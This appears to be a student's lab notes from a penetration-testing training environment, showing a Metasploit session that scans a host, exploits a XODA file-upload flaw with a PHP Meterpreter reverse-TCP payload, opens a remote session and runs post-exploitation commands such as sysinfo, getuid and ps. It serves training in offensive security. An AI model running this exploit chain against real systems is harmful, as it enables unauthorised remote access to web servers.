# Meterpreter Fundamentals

```bash
# Start Metasploit
msf6 > setg RHOSTS 192.58.18.3
RHOSTS => 192.58.18.3
msf6 > setg RHOST 192.58.18.3
RHOST => 192.58.18.3

msf6 > db_nmap -sV 192.58.18.3
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-24 11:16 IST
[*] Nmap: Nmap scan report for demo.ine.local (192.58.18.3)
[*] Nmap: Host is up (0.000024s latency).
[*] Nmap: Not shown: 998 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
[*] Nmap: 3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
[*] Nmap: MAC Address: 02:42:C0:3A:12:03 (Unknown)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Get the whole website and see what is used (XODA)
msf6 > curl http://192.58.18.3
[*] exec: curl http://192.58.18.3

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                        <script language="JavaScript" type="text/javascript">
                        //<![CDATA[
                        var countselected=0;
                        function stab(id){var _10=new Array();for(i=0;i<_10.length;i++){document.getElementById(_10[i]).className="tab";}document.getElementById(id).className="stab";}var allfiles=new Array('');
                        //]]>
                </script>
                <script language="JavaScript" type="text/javascript" src="/js/xoda.js"></script>
                <script language="JavaScript" type="text/javascript" src="/js/sorttable.js"></script>
                <link rel="stylesheet" href="/style.css" type="text/css" />
</head>

<body onload="document.lform.username.focus();">
        <div id="top">
                <a href="/" title="XODA"><span style="color: #56a;">XO</span><span style="color: #fa5;">D</span><span style="color: #56a;">A</span></a>
                        </div>
        <form method="post" action="/?log_in" name="lform" id="login">
                <p>Username:&nbsp;<input type="text" id="un" name="username" /></p>
                <p>Password:&nbsp;<input type="password" name="password" /></p>
                <p><input type="submit" name="submit" value="login" /></p>
        </form>
</body>
</html>

msf6 > search xoda
msf6 > use exploit/unix/webapp/xoda_file_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/xoda_file_upload) >
msf6 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /

msf6 exploit(unix/webapp/xoda_file_upload) > run

[*] Started reverse TCP handler on 192.58.18.2:4444 
[*] Sending PHP payload (bBChUjZI.php)
[*] Executing PHP payload (bBChUjZI.php)
[*] Sending stage (39927 bytes) to 192.58.18.3
[!] Deleting bBChUjZI.php
[*] Meterpreter session 1 opened (192.58.18.2:4444 -> 192.58.18.3:48056) at 2025-07-24 11:22:26 +0530

meterpreter > 

# Sessions
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(unix/webapp/xoda_file_upload) > 

msf6 exploit(unix/webapp/xoda_file_upload) > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -c, --command <command>              Run a command on the session given with -i, or all
    -C, --meterpreter-command <command>  Run a Meterpreter Command on the session given with -i, or all
    -d, --list-inactive                  List all inactive sessions
    -h, --help                           Help banner
    -i, --interact <id>                  Interact with the supplied session ID
```

Post Exploitation Commands
```bash
meterpreter > sysinfo
Computer    : demo.ine.local
OS          : Linux demo.ine.local 6.8.0-48-generic #48-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 27 14:04:52 UTC 2024 x86_64
Meterpreter : php/linux

# Privilege
meterpreter > getuid
Server username: www-data

# Commands available with meterpreter
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a backgro
                              und thread
    channel                   Displays information or control active cha
                              nnels
~~~~~~~~~~~~~~~~~~~

# List all the process running (useful when migrating)
meterpreter > ps

Process List
============

 PID  Name              User      Path
 ---  ----              ----      ----
 1    /bin/bash         root      /bin/bash /startup.sh
 7    logger            root      logger -loc 1 --dont_kill
 8    logger            root      logger -loc 2 --dont_kill
 9    logger            root      logger -loc 3 --dont_kill
```